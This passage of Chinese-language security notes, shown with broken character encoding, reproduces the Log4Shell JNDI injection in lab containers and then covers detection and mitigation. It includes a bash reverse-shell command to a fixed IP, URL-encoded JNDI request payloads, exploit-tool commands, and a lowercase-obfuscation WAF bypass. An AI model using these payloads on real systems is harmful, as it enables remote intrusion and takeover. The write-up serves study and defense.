loading="lazy"><figcaption>image-20230714094925609</figcaption></figure><ul><li><strong>JndiManager.lookup</strong></li></ul><p><code>JndiManager.lookup()</code>è¾ƒä¸ºç®€å•ï¼Œç›´æ¥å§”æ‰˜ç»™<code>InitialContext.lookup()</code>æ–¹æ³•ã€‚è¿™é‡Œå•ç‹¬æåˆ°è¯¥æ–¹æ³•ï¼Œæ˜¯å› ä¸ºåç»­å‡ ä¸ªè¡¥ä¸ä¸­è¾ƒä¸ºé‡è¦çš„å˜æ›´å³ä¸ºè¯¥æ–¹æ³•ã€‚</p><figure><img src="/DailyNotes/assets/image-20230714095048611-C5SeQPgz.png" alt="image-20230714095048611" tabindex="0" loading="lazy"><figcaption>image-20230714095048611</figcaption></figure><p>ï¼ˆ3ï¼‰ æ¼æ´åˆ©ç”¨</p><blockquote><p><strong>ç¯å¢ƒ1ï¼švulfocus/log4j2-cve-2021-44228:latest</strong></p></blockquote><p>åå¼¹shellå‘½ä»¤å¦‚ä¸‹ï¼š</p><pre><code>bash -i &gt;&amp; /dev/tcp/100.1.1.169/1245 0&gt;&amp;1
</code></pre><p>å°†å…¶base64ç¼–ç </p><pre><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDAuMS4xLjE2OS8xMjQ1IDA+JjE=
</code></pre><p>å…ˆç”¨JNDIæ³¨å…¥å·¥å…·èµ·RMIæˆ–ldapï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDAuMS4xLjE2OS8xMjQ1IDA+JjE=}|{base64,-d}|{bash,-i}&quot; -A 100.1.1.169
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[ADDRESS] &gt;&gt; 100.1.1.169
[COMMAND] &gt;&gt; bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDAuMS4xLjE2OS8xMjQ1IDA+JjE=}|{base64,-d}|{bash,-i}

</code></pre><figure><img src="/DailyNotes/assets/image-20230711141952152-CQCKkWZZ.png" alt="image-20230711141952152" tabindex="0" loading="lazy"><figcaption>image-20230711141952152</figcaption></figure><p>é€‰æ‹©ä¸€ä¸ªpayloadå¤åˆ¶ï¼Œæ”¾å…¥burpsuiteçš„å¦‚ä¸‹æŠ¥æ–‡ä¸­ï¼ˆéœ€è¦URLç¼–ç ï¼‰ï¼Œå‘é€ç»™ç›®æ ‡ä¸»æœºï¼š</p><pre><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/hello?payload=%24%7b%6a%6e%64%69%3a%72%6d%69%3a%2f%2f%31%30%30%2e%31%2e%31%2e%31%36%39%3a%31%30%39%39%2f%71%7a%74%73%39%63%7d%20</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.1.189:52721</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">6</span></span>

</code></pre><p>åå¼¹shellæˆåŠŸ</p><figure><img src="/DailyNotes/assets/image-20230711142555507-WWZ8Y6qE.png" alt="image-20230711142555507" tabindex="0" loading="lazy"><figcaption>image-20230711142555507</figcaption></figure><hr><blockquote><p><strong>ç¯å¢ƒ2ï¼švulhub/solr:8.11.0 ä¾èµ–äº†Log4j 2.14.1</strong></p></blockquote><p>èµ·jndiæœåŠ¡çš„æ­¥éª¤å’Œå‘½ä»¤ä¸€æ ·ï¼Œå°±æ˜¯æŠŠæ¥å£åœ°å€æ”¹æˆ<code>/solr/admin/cores?action=</code></p><pre><code class="language-http">GET /solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%72%6d%69%3a%2f%2f%31%30%30%2e%31%2e%31%2e%31%36%39%3a%31%30%39%39%2f%34%74%65%74%6f%33%7d  HTTP/1.1
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.1.189:8983</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>


</code></pre><blockquote><p><strong>ç¯å¢ƒ3ï¼šæœ¬åœ°è¿è¡Œçš„ï¼Œæºç åœ°å€https://github.com/christophetd/log4shell-vulnerable-app</strong></p><p><strong>åŒ vulfocus ghcr.io/christophetd/log4shell-vulnerable-app:latest</strong></p></blockquote><p>è¿™é‡Œä¹Ÿæ˜¯è§£æJNDIï¼Œåªæ˜¯è§£æçš„åœ°æ–¹å˜æˆäº†ä»è¯·æ±‚å¤´é‡Œä¼ è¿›å»çš„å‚æ•°</p><pre><code>java -jar .\JNDIExploit-1.4-SNAPSHOT.jar -i 10.89.17.243
</code></pre><p>èµ·LDAPæœåŠ¡</p><figure><img src="/DailyNotes/assets/image-20230711174730147-2Hu_9KPE.png" alt="image-20230711174730147" tabindex="0" loading="lazy"><figcaption>image-20230711174730147</figcaption></figure><p>æ·»åŠ è¯·æ±‚å¤´<code>X-Api-Version</code>ï¼Œå†…å®¹ä¸º<code>${jndi:ldap://10.89.17.243:1389/Basic/Command/Base64/Y2FsYw==}</code>ã€‚</p><p>ä½¿ç”¨payload<code> Basic/Command/Base64/Y2FsYw==</code>ï¼Œ<code>Y2FsYw==</code>ä¸º<code>calc</code>çš„base64ç¼–ç ï¼Œå¦‚ä¸‹ï¼š</p><figure><img src="/DailyNotes/assets/image-20230711174755203-BR0avjoj.png" alt="image-20230711174755203" tabindex="0" loading="lazy"><figcaption>image-20230711174755203</figcaption></figure><figure><img src="/DailyNotes/assets/image-20230711174909748-CnND-k-J.png" alt="image-20230711174909748" tabindex="0" loading="lazy"><figcaption>image-20230711174909748</figcaption></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><figure><img src="/DailyNotes/assets/image-20230711175225943-KN_pUehJ.png" alt="image-20230711175225943" tabindex="0" loading="lazy"><figcaption>image-20230711175225943</figcaption></figure><p>è¯·æ±‚å¤´å†…å®¹æ”¹æˆè¿™æ ·</p><pre><code>${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://10.89.17.243:1389/Basic/Command/Base64/Y2FsYw==}
</code></pre><p>è¯´ä¸å®šèƒ½ç»•è¿‡WAF</p><h3 id="_2-3-log4j2-jndiæ³¨å…¥æ¼æ´-cve-2021-45046" tabindex="-1"><a class="header-anchor" href="#_2-3-log4j2-jndiæ³¨å…¥æ¼æ´-cve-2021-45046"><span>2.3 Log4j2 JNDIæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-45046ï¼‰</span></a></h3><p>ï¼ˆ1ï¼‰æ¼æ´ä»‹ç»</p><p>å¯¹äºCVE-2021-44228æ¼æ´åœ¨<code>2.15.0</code>ç‰ˆæœ¬ä¸Šçš„ä¿®å¤ä¸å®Œå–„ï¼Œæ¼æ´å½±å“ç‰ˆæœ¬ï¼š<code>All versions from 2.0-beta9 to 2.15.0, excluding 2.12.2</code></p><p>ï¼ˆ2ï¼‰æ¼æ´åŸç†</p><p>ä»<code>2.15.0</code>ç‰ˆæœ¬å¼€å§‹ï¼Œé»˜è®¤æ˜¯ä¸å¼€å¯LookupåŠŸèƒ½ï¼Œå³<code>log42.formatMsgNoLookups</code>é»˜è®¤ä¸º<code>true</code>ã€‚å·²æ— æ³•å†é€šè¿‡è®¾ç½®è¯¥é€‰é¡¹ä¸º<code>false</code>æ¥å¼€å¯LookupåŠŸèƒ½ï¼Œåªèƒ½é€šè¿‡åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®š<code>%m{lookups}</code> æ¥å¼€å¯ã€‚</p><p>å¹¶ä¸”ï¼ŒJndiManager#lookup()æ–¹æ³•ä¸­ï¼Œè¿›è¡Œäº†ä»¥ä¸‹å®‰å…¨æ ¡éªŒï¼š</p><pre><code>(1) allowedProtocolsï¼šåªå…è®¸åè®®javaã€ldapã€ldapsï¼›
(2) allowedHostsï¼šåªå…è®¸ä¸»æœºä¸ºæœ¬æœºIP127.0.0.1ã€localhostç­‰ã€‚
(3) allowedClassesï¼šLDAPæœåŠ¡å™¨çš„è¿”å›åŒ…ä¸­javaClassNameåªå…è®¸ä¸ºåŸºæœ¬æ•°æ®ç±»å‹çš„ç±»ï¼Œæ¯”å¦‚java.lang.Booleanã€java.lang.Byteã€java.lang.Shortç­‰ç­‰ã€‚
(4) ä¸èƒ½åŠ è½½è¿œç¨‹ObjectFactoryç±»ã€‚
</code></pre><figure><img src="/DailyNotes/assets/image-20230714101905591-7UA-44CZ.png" alt="image-20230714101905591" tabindex="0" loading="lazy"><figcaption>image-20230714101905591</figcaption></figure><figure><img src="/DailyNotes/assets/image-20230714102150354-DCsxh7vO.png" alt="image-20230714102150354" tabindex="0" loading="lazy"><figcaption>image-20230714102150354</figcaption></figure><p><strong>ç»•è¿‡ä¸Šè¿°é™åˆ¶å®ç°JNDIæ³¨å…¥</strong></p><p>(1) ç»•è¿‡åè®®ç™½åå•ï¼ˆjavaã€ldapã€ldapsï¼‰</p><pre><code>åªèƒ½ä½¿ç”¨ldapåè®®è¿›è¡ŒJNDIæ³¨å…¥ã€‚
</code></pre><p>(2) ç»•è¿‡ä¸»æœºç™½åå•ï¼ˆæœ¬æœºIP127.0.0.1ã€localhostç­‰ï¼‰ã€‚ä½¿ç”¨Javaçš„ä¸€ä¸ªtrickè¿›è¡Œç»•è¿‡ï¼Œå¦‚ä¸‹ï¼š</p><pre><code>ldap://127.0.0.1#evilhost.com
å½“URI#getHost()æ–¹æ³•é‡åˆ°è¿™æ ·çš„urlæ—¶ï¼Œä¼šå–#å‰é¢ï¼Œåè®®://åé¢çš„éƒ¨åˆ†ä½œä¸ºurlçš„Host.
</code></pre><p>(3) ç»•è¿‡javaClassNameç™½åå•ï¼ˆå¦‚java.lang.Booleanã€java.lang.Byteã€java.lang.Shortç­‰ï¼‰</p><pre><code>javaClassNameè¿™ä¸ªå±æ€§çš„å€¼æ˜¯ä»LDAPæœåŠ¡å™¨è¿”å›çš„æ•°æ®é‡Œå–çš„ï¼Œè€Œä¸”è¿™ä¸ªå±æ€§çš„å€¼å¯¹äºåç»­çš„æ¼æ´åˆ©ç”¨æ¯«æ— å½±å“ï¼Œåªè¦ä¿®æ”¹ä¸€ä¸‹LDAPæœåŠ¡ç«¯çš„ä»£ç ï¼Œå°†è¯¥å€¼çš„å±æ€§æ”¹ä¸ºæ»¡è¶³log4j2ä¸­è¦æ±‚çš„å€¼å³å¯ã€‚
</code></pre><p>(4) ç»•è¿‡ä¸èƒ½åŠ è½½è¿œç¨‹ObjectFactoryç±»çš„é™åˆ¶</p><pre><code>ä¿®æ”¹LDAPæœåŠ¡å™¨ï¼Œè®©å…¶è¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè¿™æ ·ä»£ç è¿˜æ˜¯ä¼šèµ°åˆ°æœ€åçš„this.context.lookup()ã€‚åœ¨ç›®æ ‡æœåŠ¡JNDI lookupçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒclasspathä¸­åŒ…å«äº†å¯åˆ©ç”¨çš„ååºåˆ—åŒ–Gadgetï¼Œä¾¿å¯å®ç° RCEã€‚
æ‰€ä»¥è¿™é‡Œå®ç°RCEçš„å¦ä¸€ä¸ªæ¡ä»¶å°±æ˜¯ç›®æ ‡ç¯å¢ƒä¸­å­˜åœ¨å¯è¢«åˆ©ç”¨çš„Javaååºåˆ—åŒ–Gadgetã€‚
è‡³äºLDAPæœåŠ¡çš„ä¿®æ”¹ï¼Œå‚è€ƒã€ŠJNDIæ³¨å…¥ç»•è¿‡é«˜ç‰ˆæœ¬JDKé™åˆ¶ã€‹(https://blog.csdn.net/mole_exp/article/details/121141042)ï¼Œåªæ˜¯æ·»åŠ ä¸€ä¸ªè¿”å›åºåˆ—åŒ–æ•°æ®çš„åŠŸèƒ½ã€‚
</code></pre><p><strong>ç›®å‰è¿™å‡ å°ä¸»æœºéƒ½ä¸æ”¯æŒldap://127.0.0.1#evilhost.comè¿™æ ·çš„å½¢å¼ï¼Œæš‚æœªå¤ç°ã€‚</strong></p><h2 id="_3-æ£€æµ‹ä¸é˜²å¾¡" tabindex="-1"><a class="header-anchor" href="#_3-æ£€æµ‹ä¸é˜²å¾¡"><span>3. æ£€æµ‹ä¸é˜²å¾¡</span></a></h2><h3 id="_3-1-æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨" tabindex="-1"><a class="header-anchor" href="#_3-1-æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨"><span>3.1 æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨</span></a></h3><p><strong>é»‘ç›’æµ‹è¯•</strong></p><p>å¤§å®¶éƒ½çŸ¥é“å­˜åœ¨æ¼æ´æ˜¯å› ä¸ºåœ¨æ‰“æ—¥å¿—çš„æ—¶å€™å­˜åœ¨é—®é¢˜ï¼Œæ‰€ä»¥å¯¹äºé»‘ç›’æµ‹è¯•è€Œè¨€ï¼Œåªè¦æ˜¯èƒ½å¤Ÿè¢«æœåŠ¡ç«¯è·å–ä¸”è¢«è®°å½•çš„åœ°æ–¹éƒ½æ˜¯å¯èƒ½è§¦å‘æ¼æ´çš„ï¼Œæ¯”å¦‚ header ä¸­çš„ Cookieã€User-agent ç­‰ï¼Œpost æˆ–è€… get çš„å‚æ•°ä¸­ï¼Œurl ä¸­ç­‰ï¼Œè¿™ç§åªèƒ½ç›²æ‰“ï¼Œæ ¹æ®è¿”å›ç»“æœæ¥åˆ¤æ–­ã€‚</p><p>æ£€æµ‹æ¼æ´é¡¹ç›®å‚è€ƒï¼š</p><blockquote><p>https://github.com/takito1812/log4j-detect/blob/main/log4j-detect.py</p></blockquote><figure><img src="/DailyNotes/assets/a4bb089af6008b42679e7c4ca6398dbe-DceiDND3.png" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>ä¸»è¦åœ¨ header å’Œ å‚æ•°ä¸­å¢åŠ  payload è¿›è¡Œæ¼æ´è§¦å‘ï¼Œå¯ä»¥ç»“åˆ dnslog å¹³å°å®ç°è‡ªåŠ¨åŒ–æ¼æ´å‘ç°ï¼Œæ”»å‡»å›¾å¦‚ä¸‹ï¼š</p><figure><img src="/DailyNotes/assets/593f4fb0b24cee88fa82cd9a5d338c80-pvCJni9a.jpeg" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p><strong>ç™½ç›’æµ‹è¯•</strong></p><p>ç™½ç›’ç›¸å¯¹å®¹æ˜“ä¸€äº›ï¼Œæ¯•ç«Ÿä»£ç åœ¨æ‰‹åªéœ€è¦æœç´¢ git å¹³å°çš„ä»£ç ï¼Œå¦‚æœç¬¦åˆæ¼æ´ç‰ˆæœ¬èŒƒå›´å†…çš„éƒ½æ˜¯å­˜åœ¨é—®é¢˜çš„ï¼Œå…¨éƒ¨å‡çº§æ›¿æ¢å³å¯ã€‚</p><p>ä¸‹é¢æ˜¯ç«çº¿å®‰å…¨ç»Ÿè®¡çš„å…³äºå­˜åœ¨æ¼æ´ç»„ä»¶çš„åº“ï¼Œå¯ä»¥è¿›è¡Œæœç´¢</p><blockquote><p>https://log4j2.huoxian.cn/layout</p></blockquote><figure><img src="/DailyNotes/assets/1dcaf79171cc1a3d26443a5b9ed1aef6-DtJg3GXN.png" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><h3 id="_3-2-åœ¨é‡åˆ©ç”¨æ¡ˆä¾‹" tabindex="-1"><a class="header-anchor" href="#_3-2-åœ¨é‡åˆ©ç”¨æ¡ˆä¾‹"><span>3.2 åœ¨é‡åˆ©ç”¨æ¡ˆä¾‹</span></a></h3><p>éšç€æ¼æ´çš„å…¬å¼€ï¼Œåœ¨é‡åˆ©ç”¨è¯¥æ¼æ´è·å–æƒé™å¹¶è¿›è¡ŒæŒ–çŸ¿å‹’ç´¢çš„æ¡ˆä¾‹å·²ç„¶å‡ºç°ï¼Œæ¯”å¦‚å¥‡å®‰ä¿¡æ£€æµ‹åˆ°çš„æƒ…å†µï¼Œè¯¦æƒ…<a href="https://mp.weixin.qq.com/s?__biz=Mzg4OTU4MjQ4Mg==&amp;mid=2247485419&amp;idx=1&amp;sn=a8fccee9a7b0a364f9b7831bd41f4961&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">ã€Šè­¦æƒ•ï¼Log4j2æ¼æ´å·²è¢«å¤šä¸ªåƒµå°¸ç½‘ç»œå®¶æ—åˆ©ç”¨ã€‹<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼Œæ¼æ´è§¦å‘æ¡ä»¶æ˜¯åœ¨ url ä¸­å¸¦å…¥ payloadï¼š</p><figure><img src="/DailyNotes/assets/4b20d38683952c3b23aa53b027cbcf4b-CxRxxabb.png" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>æ¼æ´åˆ©ç”¨æˆåŠŸåä¼šåŠ å…¥ SSH å…¬é’¥ï¼Œè¿™ä¸ªç‰¹å¾è¿˜æ¯”è¾ƒæ˜æ˜¾ï¼Œå®¹æ˜“æ‹¦æˆªã€‚æ¯”å¦‚ç»¿ç›Ÿç§‘æŠ€æ£€æµ‹åˆ°çš„æƒ…å†µï¼Œè¯¦æƒ…<a href="https://mp.weixin.qq.com/s?__biz=Mzg2Nzg0NDkwMw==&amp;mid=2247490088&amp;idx=1&amp;sn=9968a5ecf2211952c4245fc26e66a6f3&amp;source=41#wechat_redirect" target="_blank" rel="noopener noreferrer">ã€ŠLog4j2ä¿®è¡¥æ—¶é—´å·®ï¼æŒ–çŸ¿è½¯ä»¶å’Œåƒµå°¸ç½‘ç»œä¹˜è™šè€Œå…¥ã€‹<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ï¼Œpayload åŠåˆ©ç”¨å¦‚å›¾ï¼š</p><figure><img src="/DailyNotes/assets/1fd329466a336da2e7d181814a7dfe31-BQQLIMQZ.png" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>åœ¨é‡åˆ©ç”¨ç»éæ£€æµ‹åˆ°çš„è¿™äº›æ–¹å¼ï¼Œè¿˜æœ‰æ›´å¤šæƒ³ä¸åˆ°çš„åˆ©ç”¨æ–¹å¼ï¼Œè¿™ä¸ªä¹Ÿä¼šé•¿æœŸå­˜åœ¨ã€‚</p><h3 id="_3-3-æ¼æ´é˜²æŠ¤æ–¹æ³•" tabindex="-1"><a class="header-anchor" href="#_3-3-æ¼æ´é˜²æŠ¤æ–¹æ³•"><span>3.3 æ¼æ´é˜²æŠ¤æ–¹æ³•</span></a></h3><p><strong>éƒ¨ç½² WAF ç­‰å®‰å…¨äº§å“</strong></p><p>å¦‚æœä¼ä¸šå·²ç»éƒ¨ç½²äº† WAF ç­‰å®‰å…¨äº§å“ï¼Œåœ¨æ¼æ´çˆ†å‘ä¹‹åˆå°±åº”è¯¥åŠæ—¶æ›´æ–°è§„åˆ™ï¼Œä¸´æ—¶å¤„ç½®ï¼Œä»è€Œç»™åç»­çš„æ ¹æ²»äº‰å–æ—¶é—´ï¼Œä» payload ä¸Šçœ‹ï¼Œæœ‰å‡ ä¸ªå…³é”®ç‰¹å¾:Extra open brace or missing close brace{ï¼Œåˆå¯èƒ½é€ æˆæ­£å¸¸åŠŸèƒ½æ— æ³•ä½¿ç”¨ï¼Œæ¯•ç«Ÿå¯èƒ½å­˜åœ¨æ­£å¸¸è¯·æ±‚ä¸­åŒ…å«è¿™ä¸ªå…³é”®è¯çš„æƒ…å†µã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªå…³äº waf ç»•è¿‡æ€è·¯ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºé˜²å¾¡çš„å‚è€ƒï¼š</p><p>1ã€jndiã€ldapã€rmi ç»•è¿‡</p><ul><li>ç”¨ lowerCase upperCase æŠŠå…³é”®è¯åˆ†å‰²å¼€</li><li>å¦‚æœä½¿ç”¨äº†æ­£åˆ™çš„è¯å¯ä»¥ä½¿ç”¨ upper æŠŠ jndÄ± è½¬æˆ jndi</li></ul><p>æ¡ˆä¾‹ï¼š</p><figure><img src="/DailyNotes/assets/3de16e565dd49f7577190c6cd2d2f402-B3l-jhyH.jpeg" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p>â€2ã€<code>${</code> å…³é”®è¯æ‹¦æˆªï¼ˆèŒƒå›´å¤§ä¸”å®¹æ˜“äº§ç”Ÿè¯¯æŠ¥ï¼Œä¸”ä¸èƒ½çœŸæ­£è§£å†³ï¼Œæ¼æ´çš„è§¦å‘ç‚¹æ˜¯åœ¨æ‰“å°æ—¥å¿—çš„æ—¶å€™æŠŠå¯æ§å†…å®¹æºå¸¦è¿›å»äº†ï¼‰</p><p>3ã€ä¸ºäº†å‡å°‘è¯¯æŠ¥ï¼Œwaf åŒ¹é…è§„åˆ™å‚è€ƒï¼š</p><pre><code class="language-javascript">\$<span class="token punctuation">{</span><span class="token punctuation">(</span>\$<span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">?</span><span class="token operator">:</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">?</span><span class="token operator">:</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">?</span><span class="token operator">:</span><span class="token operator">-</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&#39;|&quot;|`)*( ?1)}*|[jndi:(ldap|rm)](&#39;</span><span class="token operator">|</span>&quot;<span class="token operator">|</span>`<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">}</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">}</span>
</code></pre><p>æ•ˆæœå¦‚å›¾ï¼š</p><figure><img src="/DailyNotes/assets/3cd9b8498594f1e983a0acddb60d0855-vzPBq7Vn.jpeg" alt="img" tabindex="0" loading="lazy"><figcaption>img</figcaption></figure><p><strong>ä»£ç å±‚é¢ä¿®å¤</strong></p><p>å‡çº§log4j2ï¼šæ¼æ´å‡ºç°ä¹‹åï¼Œå®˜æ–¹ä¹Ÿä¸€ç›´åœ¨æ¨å‡ºè¡¥ä¸ï¼Œç„¶è€Œä¸€ç›´ä¹Ÿå­˜åœ¨è¡¥ä¸ç»•è¿‡çš„æƒ…å†µ ï¼Œæ‰“å®˜æ–¹è¡¥ä¸å½“ç„¶æ˜¯ä¸€ä¸ªæ¯”è¾ƒé è°±çš„æ–¹å¼ï¼Œä½†æ˜¯ä¸€å¼€å§‹å¹¶ä¸èƒ½å®Œç¾è§£å†³ã€‚</p><p>å‡çº§Javaç‰ˆæœ¬ï¼šåœ¨è¿›è¡Œæ¼æ´åˆ©ç”¨æ—¶ï¼Œé’ˆå¯¹é«˜ç‰ˆæœ¬çš„ java jdk æ˜¯æ— æ³•ç›´æ¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯ä¹Ÿä¸ä¸€å®šå®Œå…¨ä¸å¯ä»¥ï¼Œå¯¹äºä¸€äº›ä¼ä¸šï¼Œå®šæœŸæ›´æ–° java çš„å¯èƒ½å½±å“æ¯”è¾ƒå°ï¼Œæ‰€ä»¥ java ç‰ˆæœ¬æ›´æ–°ä¹Ÿæ˜¯ä¸€ç§ç¼“è§£çš„æ–¹å¼ã€‚</p><p>åˆ›å»ºâ€œlog4j2.component.propertiesâ€æ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­å¢åŠ é…ç½®â€œlog4j2.formatMsgNoLookups=trueâ€</p><p>è®¾ç½® JVM å¯åŠ¨å‚æ•° - <code>Dlog4j2.formatMsgNoLookups=true</code></p><p><strong>è¿ç»´å±‚é¢é˜²æŠ¤</strong></p><p>1ã€é‡‡ç”¨ rasp å¯¹lookupçš„è°ƒç”¨è¿›è¡Œé˜»æ–­</p><p>2ã€é™åˆ¶ä¸å¿…è¦çš„ä¸šåŠ¡è®¿é—®å¤–ç½‘</p><p>3ã€WAF æ·»åŠ æ¼æ´æ”»å‡»ä»£ç ä¸´æ—¶æ‹¦æˆªè§„åˆ™</p><blockquote><p>å‚è€ƒæ–‡çŒ®</p></blockquote><p><strong>ä»‹ç»Log4j2çš„æ–‡ç« </strong></p><p><a href="https://juejin.cn/post/7097962931690274829" target="_blank" rel="noopener noreferrer">log4j2-å…¥é—¨ç®€ä»‹<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://www.cnblogs.com/jiyukai/p/9418463.html" target="_blank" rel="noopener noreferrer">log4j2ä»‹ç»åŠé…ç½®<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><a href="https://blog.csdn.net/qq_36259143/article/details/124213506" target="_blank" rel="noopener noreferrer">Log4j2æ—¥å¿—æ¡†æ¶<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new 